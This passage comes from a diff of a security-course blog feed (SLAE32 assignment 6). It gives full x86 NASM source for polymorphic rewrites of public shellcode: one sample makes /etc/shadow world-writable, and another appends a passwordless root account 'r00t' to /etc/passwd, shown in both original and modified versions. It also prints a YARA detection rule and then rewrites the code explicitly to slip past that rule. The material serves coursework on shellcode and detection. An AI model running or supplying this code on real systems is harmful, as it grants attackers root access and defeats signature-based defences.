+mov dword [esp-12], 0x6374652f
+sub esp, 12
+mov    ebx,esp
+push word  0x1ff
+pop    cx
+mov    al,0xf
+int    0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Modified shellcode:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; MODIFIED SHELLCODE
+; Filename: chmodshadow-poly.nasm
+; Author: Jeremy Catelain
+; chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes
+
+section .text
+global _start
+
+_start: 
+mov ebx, eax
+xor eax, ebx
+push dword eax
+mov esi, 0x6374ef32 
+add esi, 0x13FA752F ;0x776F6461
+mov dword [esp-4], esi
+sub esi, 0xefc3532
+mov dword [esp-8], esi ; 0x68732f2f
+mov dword [esp-12], 0x6374652f
+sub esp, 12
+mov    ebx,esp
+push word  0x1ff
+pop    cx
+mov    al,0xf
+int    0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;--part-3---add-r00t-user-to-etcpasswd-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt;  Part 3 - Add r00t user to /etc/passwd &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;link to the original shellcode: http://shell-storm.org/shellcode/files/shellcode-211.php&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The aim of this shellcode is to add a r00t user to the /etc/passwd file. 
+To do so, the following steps are followed:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;open(“/etc//passwd”, O_WRONLY  O_APPEND)&lt;/li&gt;
+  &lt;li&gt;write(ebx, “r00t::0:0:::”, 12)&lt;/li&gt;
+  &lt;li&gt;close(ebx)&lt;/li&gt;
+  &lt;li&gt;exit()&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Execution of the shellcode:&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.12.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Content of the /etc/passwd:&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.11.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We supposed that the yara rule as follows flagged our original shellcode.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rule addr00tuser {
+    meta:
+	    description = &quot;Personal rule&quot;
+    strings:
+	    $y1 = {73 73 77 64}
+	    $y2 = {2f 2f 70 61}
+	    $y3 = {2f 65 74 63}
+	    $y4 = {30 3a 3a 3a}
+	    $y5 = {3a 3a 30 3a}
+	    $y6 = {72 30 30 74}
+    condition:
+    $y1 and $y2 and $y3 or $y4 and $y5 and $y6 
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The y1 to y3 strings correspond to the instruction for the setting of the “/etc//passwd”:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; push 0x64777373 ; dwss
+ push 0x61702f2f ; ap//
+ push 0x6374652f ; cte/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the y4 to y6 strings correspond to the instrution for the setting of the “r00t::0:0:::”:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; push 0x3a3a3a30 ; :::0
+ push 0x3a303a3a ; :0::
+ push 0x74303072 ; t00r
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The Yara rule effectively detected our shellcode:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.15.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, we modified our strings to bypass the Yara rule.&lt;/p&gt;
+
+&lt;p&gt;Modifications to bypass the “/etc//passwd” condition:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov esi, 0x53666162
+add esi, 0x11111211
+mov dword [esp-4], esi ; dwss
+sub esi, 0x3074444
+mov dword [esp-8], esi ; ap//
+sub esp, 8
+push 0x6374652f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Modifications to bypass the “r00t::0:0:::” condition:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov esi, 0x2805e3b8
+add esi, 0x12345678 
+mov dword [esp-4], esi ; :::0
+sub esp, 4
+push 0x3a303a3a ; :0::
+push 0x74303072 ; t00r
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, our modification succeded to bypass the yara rule.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.8.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Shellcode Length details&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Length of the original shellcode: 69 bytes&lt;/li&gt;
+  &lt;li&gt;Length of the modified shellcode: 100 bytes&lt;/li&gt;
+  &lt;li&gt;Percentage length of the modified shellcode from the original: 144.9%&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Original shellcode:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;By Kris Katterjohn 11/14/2006
+;69 byte shellcode to add root user &apos;r00t&apos; with no password to /etc/passwd
+;for Linux/x86
+
+section .text
+
+      global _start
+
+ _start:
+
+ ; open(&quot;/etc//passwd&quot;, O_WRONLY | O_APPEND)
+
+      push byte 5
+      pop eax
+      xor ecx, ecx
+      push ecx
+      push 0x64777373
+      push 0x61702f2f
+      push 0x6374652f
+      mov ebx, esp
+      mov cx, 02001Q
+      int 0x80
+
+      mov ebx, eax
+
+ ; write(ebx, &quot;r00t::0:0:::&quot;, 12)
+
+      push byte 4
+      pop eax
+      xor edx, edx
+      push edx
+      push 0x3a3a3a30 ; :::0
+      push 0x3a303a3a ; :0::
+      push 0x74303072 ; t00r
+      mov ecx, esp
+      push byte 12
+      pop edx
+      int 0x80
+
+ ; close(ebx)
+
+      push byte 6
+      pop eax
+      int 0x80
+
+ ; exit()
+
+      push byte 1
+      pop eax
+      int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Modified shellcode:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; MODIFIED SHELLCODE
+; Filename: addr00tuser-poly.nasm
+; Author: Jeremy Catelain
+;69 byte shellcode to add root user &apos;r00t&apos; with no password to /etc/passwd
+;for Linux/x86
+
+
+section .text
+
+      global _start
+
+ _start:
+
+ ; open(&quot;/etc//passwd&quot;, O_WRONLY | O_APPEND)
+
+      push byte 5
+      pop eax
+      xor ecx, ecx
+      push ecx
+      mov esi, 0x53666162
+      add esi, 0x11111211
+      mov dword [esp-4], esi ; dwss
+      sub esi, 0x3074444
+      mov dword [esp-8], esi ; ap//
+      sub esp, 8
+      push 0x6374652f
+      mov ebx, esp
+      mov cx, 02001Q
+      int 0x80
+
+      mov ebx, eax
+
+ ; write(ebx, &quot;r00t::0:0:::&quot;, 12)
+
+      push byte 4
+      pop eax
+      xor edx, edx
+      push edx
+      mov esi, 0x2805e3b8
+      add esi, 0x12345678 
+      mov dword [esp-4], esi ; :::0
+      sub esp, 4
+      push 0x3a303a3a ; :0::
+      push 0x74303072 ; t00r
+      mov ecx, esp
+      push byte 12
+      pop edx
+      int 0x80
+
+ ; close(ebx)
+
+      push byte 6
+      pop eax
+      int 0x80
+
+ ; exit()
+
+      push byte 1
+      pop eax
+      int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Take up at least 3 shellcodes from shell-Storm and create a polymorphic versions to beat the pattern matching The polymorphic version cannot be larger than 150% of the existing shellcode Bonus points for making it shorter in length than the original As follows the list of shellcodes that we are going to change into polymorphic ones: downloadexec chmod 0777 /etc/shadow Add r00t user to /etc/passwd</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-05T08:45:58+02:00</published><updated>2022-10-05T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Take up at least 3 shellcode samples created using Msfpayload for linux/x86&lt;/li&gt;
@@ -10,7 +868,6 @@
 &lt;ul&gt;
   &lt;li&gt;linux/x86/adduser&lt;/li&gt;
   &lt;li&gt;linux/x86/exec&lt;/li&gt;
-  &lt;li&gt;linux/x86/meterpreter/reverse_tcp -TO SUPP&lt;/li&gt;
   &lt;li&gt;linux/x86/chmod&lt;/li&gt;
 &lt;/ul&gt;
 
@@ -602,7 +1459,7 @@ int execve(const char *pathname, char *const argv[], char *const envp[]);
 
 &lt;p&gt;And, when the syscall is performed, the “ls” command line is executed:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.25.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Take up at least 3 shellcode samples created using Msfpayload for linux/x86 Use GDB/NDisasm/Libemu to dissect the functionality of the shellcode Present your analysis We are going to analyse together the following shellcodes: linux/x86/adduser linux/x86/exec linux/x86/meterpreter/reverse_tcp -TO SUPP linux/x86/chmod</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/04/Assign4-encoder.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-04T08:45:58+02:00</published><updated>2022-10-04T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/04/Assign4-encoder</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/04/Assign4-encoder.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.25.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Take up at least 3 shellcode samples created using Msfpayload for linux/x86 Use GDB/NDisasm/Libemu to dissect the functionality of the shellcode Present your analysis We are going to analyse together the following shellcodes: linux/x86/adduser linux/x86/exec linux/x86/chmod</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/04/Assign4-encoder.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-04T08:45:58+02:00</published><updated>2022-10-04T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/04/Assign4-encoder</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/04/Assign4-encoder.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Create a custom encoding scheme like the “Insertion Encoder” we showed you;&lt;/li&gt;
